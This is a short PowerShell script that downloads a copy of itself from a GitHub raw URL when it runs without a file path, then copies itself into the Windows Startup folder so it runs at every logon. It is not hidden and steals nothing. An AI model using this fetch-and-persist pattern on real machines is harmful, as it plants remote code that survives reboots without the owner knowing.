# Get the script's full path (alternative method for remote execution)
if ($MyInvocation.MyCommand.Path) {
    $ScriptPath = $MyInvocation.MyCommand.Path
} else {
    $ScriptPath = $PSCommandPath
}

# Ensure the script is running from a file, otherwise download itself
if (-not $ScriptPath) {
    $ScriptPath = "$env:TEMP\startup.ps1"
    Invoke-WebRequest -Uri "https://raw.githubusercontent.com/ArturCassu/ProjetoAlex/main/index.ps1" -OutFile $ScriptPath
}

# Get the startup folder path
$StartupFolder = [System.IO.Path]::Combine($env:APPDATA, "Microsoft\Windows\Start Menu\Programs\Startup")

# Define the destination path
$StartupScriptPath = [System.IO.Path]::Combine($StartupFolder, "index.ps1")

# Copy the script to the startup folder
Copy-Item -Path $ScriptPath -Destination $StartupScriptPath -Force

Write-Host "Script added to startup: $StartupScriptPath"
